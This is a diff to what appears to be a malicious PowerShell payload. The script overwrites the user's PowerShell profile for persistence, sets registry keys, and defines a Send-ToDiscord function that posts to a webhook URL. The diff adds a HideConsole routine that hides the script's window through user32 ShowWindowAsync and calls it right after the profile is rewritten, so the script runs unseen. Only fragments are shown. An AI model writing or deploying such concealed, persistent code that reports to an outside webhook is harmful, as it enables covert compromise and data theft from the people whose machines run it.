@@ -1,5 +1,7 @@
 $webhookUrl = "$dc"
 
+$hideWindow = 0 # 1 = Hidden
+
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(60, 20)
 Clear-Host
@@ -8,6 +10,23 @@ Clear-Host
 Test-Path $Profile
 $directory = Join-Path ([Environment]::GetFolderPath("MyDocuments")) WindowsPowerShell
 $ps1Files = Get-ChildItem -Path $directory -Filter *.ps1
+
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
+}
 
 function CreateRegKeys {
     param ([string]$KeyPath)
@@ -101,7 +120,7 @@ catch [System.Management.Automation.PSNotSupportedException]
 "@
 
 $scriptblock | Out-File -FilePath $Profile -Force
-
+HideConsole
 
 function Send-ToDiscord {
     param (
